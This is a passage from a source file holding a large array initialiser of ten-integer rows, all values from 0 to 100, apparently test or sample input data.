    {83, 42, 41, 68, 87, 18, 28, 77, 40, 94},
    {76, 25, 98, 88, 5, 21, 11, 31, 16, 43},
    {16, 44, 29, 86, 60, 37, 1, 24, 20, 88},
    {67, 69, 29, 7, 36, 16, 25, 65, 59, 65},
    {24, 1, 56, 21, 89, 61, 42, 100, 58, 25},
    {8, 74, 69, 3, 25, 95, 40, 26, 85, 27},
    {81, 51, 96, 9, 58, 32, 25, 49, 63, 51},
    {80, 87, 52, 35, 74, 40, 62, 82, 5, 19},
    {73, 13, 59, 7, 16, 84, 1, 56, 77, 53},
    {49, 57, 3, 45, 66, 28, 43, 58, 77, 72},
    {8, 57, 58, 60, 92, 98, 66, 20, 79, 71},
    {39, 52, 84, 65, 59, 100, 48, 27, 21, 91},
    {80, 71, 47, 83, 82, 80, 10, 24, 37, 54},
    {62, 45, 10, 86, 71, 68, 83, 36, 88, 27},
    {6, 94, 79, 56, 58, 4, 55, 72, 98, 42},
    {63, 77, 12, 9, 25, 60, 89, 2, 50, 92},
    {56, 11, 2, 32, 97, 73, 100, 79, 75, 88},
    {73, 47, 47, 17, 2, 4, 21, 23, 42, 18},
    {66, 4, 61, 44, 81, 87, 71, 35, 89, 20},
    {27, 10, 32, 96, 42, 95, 69, 41, 40, 9},
    {95, 12, 23, 41, 29, 25, 11, 17, 15, 54},
    {1, 47, 24, 63, 57, 4, 49, 27, 40, 3},
    {48, 33, 13, 46, 95, 55, 40, 29, 96, 46},
    {39, 57, 58, 62, 98, 54, 53, 76, 71, 68},
    {29, 72, 81, 53, 34, 38, 24, 49, 65, 30},
    {52, 79, 29, 31, 24, 23, 86, 31, 53, 48},
    {77, 92, 4, 1, 19, 68, 55, 72, 9, 92},
    {6, 38, 63, 87, 58, 64, 24, 82, 79, 56},
    {78, 98, 34, 6, 28, 25, 29, 81, 22, 82},
    {28, 65, 39, 99, 66, 58, 32, 87, 97, 42},
    {78, 2, 46, 7, 55, 3, 71, 46, 51, 49},
    {1, 28, 46, 1, 34, 41, 26, 30, 21, 48},
    {11, 49, 80, 17, 13, 45, 75, 11, 99, 37},
    {53, 76, 39, 66, 83, 95, 35, 19, 40, 87},
    {69, 7, 81, 81, 8, 82, 21, 35, 11, 42},
    {49, 89, 57, 95, 5, 36, 40, 47, 14, 38},
    {84, 33, 80, 23, 99, 29, 84, 34, 48, 90},
    {87, 16, 97, 67, 64, 71, 48, 51, 72, 59},
    {60, 88, 48, 83, 82, 53, 86, 21, 66, 100},
    {25, 50, 32, 72, 39, 31, 0, 22, 65, 48},
    {78, 51, 31, 40, 84, 61, 10, 32, 11, 83},
    {57, 71, 70, 4, 20, 51, 24, 5, 39, 90},
    {4, 30, 5, 36, 1, 44, 33, 68, 66, 64},
    {16, 9, 81, 13, 49, 65, 74, 60, 97, 51},
    {42, 19, 89, 11, 24, 8, 28, 14, 13, 67},
    {70, 84, 64, 76, 86, 65, 19, 19, 100, 52},
    {54, 12, 52, 56, 8, 30, 44, 94, 44, 39},
    {65, 19, 51, 91, 15, 89, 34, 25, 58, 20},
    {51, 38, 65, 30, 7, 20, 10, 51, 18, 43},
    {71, 97, 61, 26, 5, 57, 70, 65, 0, 75},
    {29, 86, 93, 87, 87, 64, 75, 88, 89, 100},
    {7, 40, 37, 38, 36, 44, 24, 46, 95, 43},
    {89, 32, 5, 15, 58, 77, 72, 95, 8, 38},
    {69, 37, 24, 27, 90, 77, 92, 31, 30, 80},
    {30, 37, 86, 33, 76, 21, 77, 100, 68, 37},
    {8, 22, 69, 81, 38, 94, 57, 76, 54, 65},
    {14, 89, 69, 4, 16, 24, 47, 7, 21, 78},
    {53, 17, 81, 39, 50, 22, 60, 93, 89, 94},
    {30, 97, 16, 65, 43, 20, 24, 67, 62, 78},
    {98, 42, 67, 32, 46, 49, 57, 60, 56, 44},
    {37, 75, 62, 17, 13, 11, 40, 40, 4, 95},
    {100, 0, 57, 82, 31, 0, 1, 56, 67, 30},
    {100, 64, 72, 66, 63, 18, 81, 19, 44, 2},
    {63, 81, 78, 91, 64, 91, 2, 70, 97, 73},
    {64, 97, 39, 21, 78, 70, 21, 46, 25, 54},
    {76, 92, 84, 47, 57, 46, 31, 38, 31, 75},
    {40, 61, 21, 84, 51, 86, 41, 19, 21, 37},
    {58, 86, 100, 97, 73, 44, 67, 60, 90, 58},
    {13, 31, 49, 63, 44, 73, 76, 76, 77, 73},
    {16, 83, 100, 4, 67, 51, 56, 7, 36, 77},
    {10, 95, 28, 10, 57, 0, 54, 23, 60, 9},
    {48, 39, 40, 97, 69, 84, 35, 44, 25, 11},
    {83, 8, 61, 83, 12, 27, 100, 34, 0, 35},
    {10, 10, 96, 39, 87, 53, 5, 40, 42, 66},
    {15, 90, 71, 55, 87, 39, 5, 88, 49, 97},
    {100, 32, 4, 60, 81, 83, 53, 80, 16, 53},
    {14, 94, 29, 77, 99, 16, 29, 3, 22, 71},
    {35, 4, 61, 6, 25, 13, 11, 30, 0, 27},
    {94, 66, 25, 64, 92, 5, 47, 44, 85, 29},
    {63, 65, 89, 59, 41, 87, 41, 36, 57, 29},
    {7, 92, 33, 34, 64, 59, 47, 76, 55, 13},
    {2, 48, 46, 27, 12, 37, 99, 25, 48, 83},
    {20, 77, 13, 9, 35, 55, 62, 76, 57, 18},
    {72, 64, 10, 4, 64, 74, 63, 77, 15, 18},
    {91, 84, 32, 36, 77, 10, 39, 75, 35, 87},
    {23, 22, 30, 37, 31, 65, 58, 53, 64, 24},
    {67, 83, 4, 79, 17, 100, 63, 37, 56, 93},
    {39, 81, 18, 100, 51, 59, 5, 81, 100, 63},
    {58, 61, 24, 53, 87, 64, 37, 10, 83, 67},
    {34, 49, 50, 38, 27, 33, 4, 56, 70, 60},
    {15, 75, 6, 33, 40, 57, 59, 46, 4, 24},
    {75, 62, 86, 100, 81, 38, 29, 17, 48, 79},
    {84, 48, 27, 100, 87, 21, 32, 57, 77, 68},
    {16, 92, 9, 22, 92, 49, 79, 16, 95, 83},
    {40, 70, 10, 25, 35, 91, 29, 30, 74, 43},
    {8, 24, 92, 2, 23, 44, 23, 22, 0, 66},
    {56, 16, 58, 65, 4, 15, 14, 49, 31, 75},
    {32, 71, 10, 8, 63, 45, 100, 92, 42, 73},
    {1, 50, 97, 93, 18, 87, 36, 41, 75, 36},
    {7, 30, 18, 31, 96, 22, 12, 76, 71, 43},
    {50, 69, 80, 61, 78, 42, 72, 43, 0, 13},
    {15, 68, 30, 79, 60, 48, 31, 62, 56, 5},
    {98, 29, 1, 82, 26, 97, 3, 38, 72, 40},
    {81, 89, 76, 26, 15, 53, 35, 87, 96, 1},
    {67, 77, 69, 97, 21, 28, 10, 18, 90, 32},
    {23, 53, 61, 25, 34, 87, 88, 3, 91, 26},
    {9, 37, 81, 85, 64, 96, 3, 99, 82, 65},
    {100, 48, 42, 68, 10, 29, 62, 88, 48, 17},
    {19, 37, 70, 47, 28, 70, 100, 16, 73, 91},
    {8, 82, 94, 89, 33, 57, 84, 36, 21, 31},
    {1, 87, 46, 9, 20, 56, 4, 82, 9, 52},
    {99, 96, 56, 34, 8, 84, 3, 7, 66, 42},
    {64, 74, 24, 58, 28, 23, 81, 11, 59, 2},
    {9, 26, 55, 55, 1, 76, 77, 6, 23, 24},
    {22, 83, 11, 84, 30, 77, 67, 88, 9, 86},
    {72, 91, 33, 35, 72, 89, 86, 11, 54, 53},
    {38, 17, 32, 29, 72, 53, 76, 71, 71, 62},
    {42, 93, 44, 19, 76, 41, 62, 42, 28, 71},
    {27, 66, 27, 26, 1, 99, 14, 87, 10, 35},
    {5, 14, 52, 37, 43, 90, 91, 18, 60, 27},
    {81, 68, 19, 24, 87, 95, 31, 48, 3, 59},
    {18, 97, 92, 11, 90, 93, 10, 70, 45, 20},
    {80, 46, 74, 26, 38, 67, 59, 31, 23, 64},
    {29, 1, 38, 6, 33, 4, 44, 100, 60, 90},
    {48, 32, 50, 71, 1, 63, 67, 87, 5, 17},
    {3, 51, 29, 77, 77, 33, 10, 35, 65, 100},
    {65, 60, 0, 2, 32, 33, 73, 42, 99, 100},
    {32, 12, 31, 48, 84, 99, 11, 50, 86, 83},
    {34, 55, 33, 63, 32, 76, 97, 8, 77, 27},
    {7, 7, 53, 74, 76, 85, 73, 14, 27, 72},
    {13, 59, 50, 11, 73, 33, 9, 84, 50, 61},
    {32, 84, 16, 31, 12, 14, 6, 8, 89, 49},
    {1, 96, 56, 54, 35, 31, 39, 7, 46, 32},
    {45, 59, 57, 96, 36, 29, 95, 46, 80, 10},
    {73, 11, 94, 89, 9, 73, 69, 15, 47, 57},
    {31, 49, 18, 87, 69, 53, 18, 74, 27, 30},
    {5, 38, 55, 28, 33, 92, 58, 95, 3, 37},
    {4, 76, 14, 65, 31, 23, 37, 66, 5, 50},
    {23, 36, 99, 41, 22, 68, 61, 6, 7, 88},
    {2, 13, 92, 58, 41, 92, 15, 65, 86, 18},
    {1, 56, 60, 83, 87, 57, 5, 90, 23, 10},
    {40, 12, 12, 38, 19, 35, 72, 80, 7, 80},
    {33, 10, 59, 25, 34, 66, 16, 49, 31, 68},
    {33, 99, 23, 59, 47, 10, 16, 53, 100, 5},
    {29, 39, 17, 42, 44, 2, 43, 82, 49, 16},
    {27, 82, 93, 86, 73, 26, 18, 55, 75, 49},
    {89, 7, 13, 79, 33, 61, 55, 15, 80, 20},
    {20, 75, 60, 3, 83, 70, 5, 92, 17, 54},
    {8, 45, 2, 0, 30, 41, 27, 14, 63, 68},
    {29, 51, 42, 43, 96, 75, 70, 50, 90, 49},
    {71, 9, 90, 97, 79, 73, 66, 50, 64, 83},
    {4, 72, 27, 73, 39, 24, 80, 32, 4, 42},
    {100, 34, 60, 41, 43, 55, 82, 12, 5, 71},
    {27, 42, 46, 16, 38, 24, 89, 3, 41, 19},
    {52, 11, 57, 46, 84, 96, 36, 29, 27, 40},
    {72, 94, 40, 98, 0, 83, 18, 83, 95, 90},
    {53, 88, 31, 66, 71, 69, 56, 59, 38, 97},
    {44, 57, 7, 1, 2, 57, 97, 4, 87, 91},
    {10, 24, 84, 51, 21, 84, 33, 39, 66, 95},
    {96, 86, 82, 26, 51, 52, 96, 73, 78, 33},
    {70, 21, 90, 77, 89, 58, 0, 86, 28, 87},
    {42, 39, 10, 25, 56, 98, 75, 89, 2, 7},
    {49, 98, 59, 98, 24, 76, 15, 86, 48, 59},
    {18, 17, 81, 75, 61, 69, 99, 61, 20, 27},
    {13, 62, 32, 90, 53, 88, 87, 95, 42, 89},
    {1, 58, 53, 60, 55, 43, 1, 70, 28, 49},
    {29, 12, 33, 76, 53, 60, 10, 52, 87, 98},
    {45, 100, 25, 43, 89, 79, 97, 41, 73, 4},
    {96, 40, 62, 48, 66, 16, 91, 67, 53, 85},
    {82, 48, 98, 14, 90, 50, 74, 66, 68, 26},
    {63, 12, 25, 89, 55, 80, 33, 17, 20, 72},
    {100, 8, 77, 73, 2, 31, 89, 17, 50, 85},
    {46, 48, 93, 83, 35, 67, 7, 11, 54, 78},
    {21, 13, 7, 88, 64, 91, 38, 74, 87, 56},
    {94, 86, 64, 70, 25, 32, 67, 80, 50, 16},
    {64, 62, 30, 56, 10, 32, 89, 17, 9, 8},
    {95, 31, 21, 68, 18, 85, 59, 22, 24, 11},
    {78, 84, 97, 42, 19, 88, 40, 86, 67, 90},
    {68, 30, 17, 99, 52, 27, 30, 40, 44, 5},
    {49, 5, 36, 70, 73, 20, 21, 31, 43, 11},
    {42, 20, 96, 5, 28, 14, 93, 69, 67, 26},
    {24, 34, 56, 8, 99, 75, 35, 95, 14, 46},
    {0, 29, 51, 36, 66, 23, 57, 87, 21, 100},
    {98, 29, 86, 59, 0, 81, 74, 60, 15, 40},
    {86, 39, 40, 7, 47, 5, 82, 49, 100, 63},
    {95, 66, 92, 11, 2, 57, 0, 25, 9, 21},
    {91, 74, 17, 76, 32, 17, 22, 72, 43, 37},
    {78, 28, 77, 18, 36, 90, 90, 84, 38, 89},
    {46, 99, 21, 4, 9, 90, 27, 10, 14, 3},
    {98, 4, 77, 14, 46, 75, 99, 35, 47, 41},
    {72, 24, 70, 48, 8, 72, 4, 98, 55, 42},
    {53, 68, 7, 74, 72, 16, 63, 99, 26, 43},
    {1, 24, 13, 44, 4, 25, 19, 2, 60, 32},
    {10, 32, 22, 80, 46, 98, 17, 50, 95, 38},
    {59, 13, 5, 66, 87, 77, 48, 15, 42, 41},
    {58, 9, 31, 71, 54, 35, 97, 39, 4, 56},
    {37, 14, 88, 59, 60, 0, 56, 77, 50, 17},
    {81, 75, 30, 87, 6, 84, 29, 55, 99, 37},
    {96, 57, 47, 26, 94, 67, 27, 56, 5, 98},
    {12, 8, 11, 66, 67, 37, 66, 90, 80, 83},
    {6, 61, 23, 2, 47, 30, 86, 42, 51, 51},
    {54, 85, 14, 78, 31, 56, 96, 99, 20, 87},
    {27, 65, 87, 32, 6, 14, 23, 89, 8, 45},
    {77, 12, 26, 51, 82, 88, 23, 44, 71, 17},
    {68, 25, 69, 82, 2, 100, 3, 99, 64, 91},
    {85, 91, 21, 38, 90, 28, 52, 79, 83, 26},
    {23, 60, 38, 49, 10, 86, 2, 33, 29, 74},
    {16, 97, 65, 51, 45, 67, 16, 48, 31, 81},
    {4, 16, 37, 26, 20, 93, 20, 38, 71, 2},
    {64, 94, 62, 69, 9, 72, 54, 11, 71, 84},
    {51, 54, 80, 15, 4, 24, 83, 88, 39, 80},
    {68, 43, 62, 71, 35, 82, 64, 55, 19, 0},
    {58, 84, 95, 19, 18, 3, 58, 72, 81, 95},
    {55, 32, 14, 1, 47, 19, 92, 96, 6, 30},
    {76, 40, 40, 37, 77, 75, 19, 6, 30, 38},
    {7, 54, 88, 68, 73, 5, 71, 97, 78, 51},
    {58, 99, 49, 72, 66, 97, 57, 58, 58, 63},
    {54, 33, 69, 60, 37, 12, 1, 56, 18, 31},
    {60, 92, 51, 14, 59, 90, 19, 29, 87, 63},
    {47, 10, 28, 96, 82, 94, 58, 39, 17, 16},
    {68, 38, 15, 3, 64, 52, 15, 65, 74, 100},
    {62, 0, 92, 12, 14, 50, 2, 33, 46, 55},
    {63, 59, 65, 91, 20, 46, 50, 79, 51, 34},
    {61, 19, 72, 76, 89, 35, 95, 3, 67, 68},
    {69, 28, 68, 60, 41, 82, 77, 43, 82, 22},
    {98, 44, 47, 28, 0, 67, 74, 50, 11, 92},
    {84, 72, 77, 21, 14, 65, 23, 8, 34, 90},
    {42, 2, 84, 10, 63, 24, 58, 5, 33, 5},
    {94, 97, 15, 40, 24, 15, 6, 65, 32, 18},
    {56, 82, 56, 32, 70, 70, 97, 93, 78, 30},
    {48, 87, 99, 31, 97, 27, 22, 20, 32, 55},
    {93, 25, 52, 7, 31, 42, 90, 4, 6, 88},
    {89, 62, 35, 44, 60, 4, 81, 56, 63, 24},
    {52, 10, 10, 17, 8, 73, 44, 30, 94, 77},
    {51, 86, 68, 69, 59, 66, 11, 48, 70, 84},
    {1, 58, 12, 37, 68, 72, 41, 48, 95, 71},
    {73, 12, 47, 83, 29, 55, 56, 74, 51, 15},
    {16, 2, 67, 50, 71, 92, 15, 82, 6, 51},
    {66, 7, 75, 44, 44, 43, 15, 52, 57, 9},
    {22, 96, 89, 35, 79, 17, 91, 0, 57, 7},
    {82, 73, 9, 14, 90, 81, 5, 4, 28, 11},
    {22, 60, 19, 97, 3, 29, 5, 86, 81, 63},
    {61, 69, 58, 49, 71, 2, 67, 27, 69, 90},
    {34, 50, 29, 44, 64, 18, 91, 36, 89, 85},
    {47, 10, 45, 32, 7, 14, 62, 12, 100, 8},
    {41, 61, 44, 100, 9, 14, 68, 42, 41, 37},
    {99, 75, 87, 27, 85, 17, 45, 75, 53, 33},
    {26, 66, 10, 71, 99, 84, 85, 60, 62, 51},
    {68, 3, 11, 11, 69, 87, 92, 36, 96, 32},
    {39, 94, 74, 93, 87, 58, 9, 31, 100, 28},
    {30, 25, 94, 6, 62, 92, 90, 12, 17, 52},
    {29, 86, 55, 40, 63, 90, 94, 21, 92, 55},
    {53, 31, 14, 93, 23, 0, 17, 99, 98, 16},
    {26, 27, 7, 86, 34, 35, 78, 90, 13, 95},
    {41, 43, 46, 62, 49, 76, 51, 42, 97, 9},
    {63, 15, 40, 77, 8, 63, 43, 25, 61, 40},
    {7, 53, 68, 81, 38, 68, 82, 82, 57, 95},
    {43, 65, 37, 55, 93, 87, 30, 10, 95, 93},
    {19, 58, 75, 59, 0, 83, 88, 44, 74, 14},
    {50, 47, 67, 17, 94, 71, 51, 75, 53, 75},
    {69, 96, 5, 73, 16, 98, 59, 13, 7, 19},
    {5, 93, 43, 80, 17, 44, 28, 4, 54, 68},
    {18, 3, 14, 51, 88, 7, 22, 4, 48, 41},
    {45, 17, 2, 50, 90, 18, 14, 14, 31, 88},
    {33, 3, 81, 77, 49, 98, 87, 44, 2, 6},
    {11, 87, 76, 93, 4, 63, 66, 26, 34, 14},
    {33, 79, 98, 35, 29, 53, 19, 43, 67, 51},
    {30, 66, 20, 77, 8, 69, 75, 61, 79, 43},
    {33, 91, 96, 9, 49, 100, 38, 14, 25, 72},
    {28, 58, 51, 92, 59, 46, 44, 79, 55, 77},
    {96, 51, 9, 15, 28, 17, 50, 69, 45, 29},
    {11, 78, 86, 6, 53, 34, 73, 92, 48, 98},
    {29, 43, 22, 46, 34, 47, 92, 79, 25, 12},
    {55, 87, 64, 64, 68, 58, 48, 18, 93, 59},
    {13, 70, 2, 99, 76, 56, 32, 14, 13, 46},
    {12, 42, 89, 0, 89, 23, 13, 46, 1, 5},
    {59, 22, 92, 89, 53, 60, 12, 67, 44, 4},
    {92, 57, 74, 94, 55, 15, 15, 53, 30, 28},
    {99, 8, 71, 88, 75, 59, 77, 88, 4, 44},
    {93, 29, 66, 51, 17, 85, 10, 96, 17, 54},
    {36, 14, 55, 34, 43, 3, 73, 100, 73, 18},
    {67, 89, 93, 1, 37, 6, 11, 17, 82, 85},
    {2, 88, 68, 67, 68, 50, 99, 60, 9, 15},
    {49, 12, 30, 70, 12, 73, 73, 85, 38, 11},
    {2, 71, 67, 95, 39, 3, 67, 16, 20, 15},
    {0, 90, 69, 34, 22, 36, 85, 20, 63, 94},
    {36, 11, 72, 32, 48, 84, 71, 87, 69, 75},
    {65, 37, 11, 31, 99, 50, 34, 31, 33, 20},
    {46, 100, 76, 15, 34, 98, 17, 18, 18, 80},
    {78, 20, 58, 16, 18, 72, 100, 55, 58, 34},
    {96, 89, 72, 6, 86, 36, 23, 86, 67, 56},
    {6, 80, 21, 48, 61, 55, 46, 78, 39, 30},
    {24, 84, 50, 48, 100, 34, 19, 65, 89, 43},
    {100, 84, 32, 37, 56, 17, 73, 79, 3, 5},
    {0, 76, 85, 22, 23, 45, 43, 35, 23, 83},
    {65, 13, 32, 14, 61, 31, 14, 46, 96, 2},
    {89, 61, 52, 87, 64, 8, 4, 2, 53, 74},
    {8, 54, 15, 93, 42, 38, 4, 85, 40, 94},
    {67, 4, 6, 99, 86, 33, 96, 100, 79, 58},
    {69, 33, 85, 20, 20, 49, 95, 91, 17, 14},
    {64, 25, 68, 79, 85, 76, 83, 89, 60, 22},
    {82, 94, 27, 54, 58, 79, 87, 54, 78, 31},
    {78, 12, 64, 62, 100, 84, 10, 94, 74, 28},
    {7, 37, 19, 41, 82, 70, 16, 31, 58, 43},
    {19, 5, 36, 12, 59, 94, 91, 11, 13, 69},
    {42, 91, 81, 6, 53, 80, 90, 29, 40, 30},
    {23, 13, 33, 9, 21, 15, 79, 3, 12, 37},
    {46, 31, 8, 48, 44, 34, 42, 34, 45, 21},
    {69, 54, 12, 16, 60, 65, 96, 15, 60, 1},
    {45, 84, 82, 45, 93, 2, 60, 71, 5, 38},
    {74, 18, 69, 49, 66, 12, 83, 74, 47, 94},
    {96, 15, 47, 74, 31, 6, 4, 94, 89, 64},
    {61, 100, 13, 42, 44, 72, 44, 70, 9, 16},
    {7, 83, 34, 77, 98, 66, 55, 80, 40, 1},
    {74, 1, 84, 20, 41, 81, 94, 45, 40, 48},
    {8, 1, 47, 89, 43, 58, 60, 54, 27, 69},
    {36, 1, 18, 70, 44, 15, 1, 99, 96, 7},
    {0, 35, 75, 50, 21, 15, 30, 14, 60, 37},
    {62, 35, 38, 76, 23, 47, 33, 49, 67, 60},
    {18, 2, 27, 2, 38, 71, 17, 6, 70, 79},
    {13, 36, 80, 89, 86, 1, 3, 82, 15, 30},
    {18, 44, 31, 22, 19, 54, 36, 52, 69, 69},
    {78, 53, 72, 5, 55, 76, 42, 73, 82, 11},
    {17, 62, 47, 98, 50, 99, 99, 19, 81, 80},
    {15, 65, 23, 46, 54, 8, 66, 56, 60, 35},
    {24, 4, 88, 62, 76, 43, 38, 17, 82, 86},
    {29, 65, 47, 42, 62, 63, 41, 26, 49, 88},
    {6, 64, 18, 96, 10, 72, 4, 42, 94, 64},
    {77, 18, 34, 31, 80, 9, 40, 84, 27, 21},
    {70, 22, 86, 83, 64, 14, 46, 4, 40, 61},
    {92, 46, 24, 10, 42, 0, 48, 12, 9, 42},
    {76, 86, 26, 77, 83, 5, 86, 22, 56, 79},
    {43, 92, 0, 96, 40, 65, 76, 52, 35, 15},
    {12, 94, 28, 3, 3, 36, 3, 17, 48, 79},
    {25, 90, 65, 51, 66, 47, 23, 18, 36, 79},
    {97, 79, 36, 98, 40, 76, 28, 15, 28, 63},
    {98, 40, 56, 25, 43, 25, 27, 13, 9, 75},
    {92, 34, 30, 22, 86, 97, 36, 75, 81, 72},
    {19, 77, 16, 55, 40, 23, 97, 68, 4, 24},
    {31, 1, 31, 53, 93, 40, 79, 19, 19, 88},
    {60, 78, 88, 91, 66, 39, 53, 1, 13, 33},
    {39, 32, 76, 22, 53, 16, 11, 16, 84, 15},
    {40, 81, 17, 37, 34, 76, 44, 79, 96, 63},
    {32, 21, 6, 86, 11, 73, 25, 30, 40, 4},
    {29, 46, 3, 5, 68, 56, 21, 79, 72, 71},
    {60, 79, 18, 77, 82, 52, 53, 25, 97, 14},
    {55, 95, 35, 61, 80, 13, 33, 4, 9, 74},
    {9, 39, 19, 12, 10, 53, 34, 98, 98, 73},
    {68, 57, 17, 52, 0, 99, 3, 19, 24, 66},
    {100, 79, 60, 34, 39, 40, 13, 39, 44, 23},
    {79, 19, 28, 64, 98, 38, 16, 32, 35, 80},
    {71, 69, 36, 88, 21, 2, 86, 91, 21, 76},
    {57, 87, 20, 83, 21, 26, 22, 0, 65, 33},
    {90, 9, 18, 17, 73, 16, 55, 55, 14, 56},
    {34, 85, 92, 36, 38, 79, 5, 90, 35, 93},
    {66, 58, 80, 86, 41, 67, 78, 29, 67, 8},
    {62, 57, 17, 47, 74, 90, 63, 96, 44, 43},
    {17, 44, 27, 75, 47, 65, 53, 52, 54, 55},
    {10, 86, 12, 90, 38, 53, 56, 15, 49, 23},
    {24, 77, 46, 41, 23, 19, 98, 86, 81, 7},
    {95, 65, 18, 21, 39, 31, 52, 59, 49, 73},
    {13, 59, 24, 25, 49, 62, 45, 4, 44, 60},
    {94, 34, 36, 39, 41, 60, 25, 4, 11, 72},
    {12, 6, 36, 97, 94, 76, 27, 12, 34, 76},
    {85, 13, 34, 75, 4, 83, 3, 49, 54, 47},
    {8, 47, 47, 11, 53, 88, 71, 44, 59, 48},
    {15, 71, 54, 52, 67, 14, 27, 94, 26, 27},
};
